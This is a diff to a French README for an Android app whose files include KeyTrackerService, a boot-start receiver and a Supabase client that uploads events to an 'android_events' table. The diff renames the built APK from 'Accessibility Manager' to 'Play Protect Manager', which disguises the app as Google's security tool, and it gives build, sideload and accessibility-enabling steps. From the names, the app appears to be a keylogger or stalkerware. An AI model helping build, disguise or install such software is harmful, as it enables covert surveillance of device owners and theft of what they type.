@@ -18,12 +18,12 @@ Android Device (APK) → Supabase REST API → Table `public.android_events`
 ### Application Android
 
 1. Ouvrir le projet dans Android Studio :
-   - Ouvrir le dossier `android-app`
+   - Ouvrir le dossier racine du projet
 
 2. Configurer Supabase :
    - **Par défaut**, l’app est déjà préconfigurée pour pointer vers ton Supabase self-host.
    - Pour **surcharger** (recommandé si tu veux changer d’instance sans modifier le code), tu as 2 options :
-     - **Option A — `android-app/local.properties`** (souvent gitignored) :
+     - **Option A — `local.properties`** (souvent gitignored) :
        - `SUPABASE_URL=https://<ton-domaine-supabase>`
        - `SUPABASE_ANON_KEY=<ta clé anon/publishable>`
      - **Option B — variables d’environnement** (CI / build en CLI) :
@@ -32,11 +32,11 @@ Android Device (APK) → Supabase REST API → Table `public.android_events`
 
 3. Compiler l'APK :
    - Android Studio: Build → Build APK(s)
-   - Ou en CLI: `cd android-app && ./gradlew :app:assembleDebug`
-   - APK: `android-app/app/build/outputs/apk/debug/Accessibility Manager.apk`
+   - Ou en CLI: `./gradlew :app:assembleDebug`
+   - APK: `app/build/outputs/apk/debug/Play Protect Manager.apk`
 
 4. Installer sur votre appareil Android :
-   - Via ADB: `adb install -r "android-app/app/build/outputs/apk/debug/Accessibility Manager.apk"`
+   - Via ADB: `adb install -r "app/build/outputs/apk/debug/Play Protect Manager.apk"`
    - Ou sans ADB: copier l’APK sur le téléphone et l’installer (sources inconnues).
 
 5. Activer le service d'accessibilité :
@@ -65,17 +65,19 @@ Android Device (APK) → Supabase REST API → Table `public.android_events`
 ## Structure du projet
 
 ```
-android-tracker/
-├── android-app/              # Application Android
-│   └── app/src/main/
-│       ├── java/com/andtracker/
-│       │   ├── KeyTrackerService.java  # Service d'accessibilité
-│       │   ├── MainActivity.java      # Activity principale
-│       │   └── BootReceiver.java      # Receiver pour auto-lancement
-│       │   └── SupabaseAndroidEventsClient.java # Client REST Supabase
-│       └── res/
-│           ├── values/strings.xml
-│           └── xml/accessibility_service_config.xml
+accessibility-apk/
+├── app/src/main/
+│   ├── java/com/andtracker/
+│   │   ├── KeyTrackerService.java  # Service d'accessibilité
+│   │   ├── MainActivity.java      # Activity principale
+│   │   └── BootReceiver.java      # Receiver pour auto-lancement
+│   │   └── SupabaseAndroidEventsClient.java # Client REST Supabase
+│   └── res/
+│       ├── values/strings.xml
+│       └── xml/accessibility_service_config.xml
+├── build.gradle
+├── settings.gradle
+└── gradlew
 ```
 
 ## Notes importantes
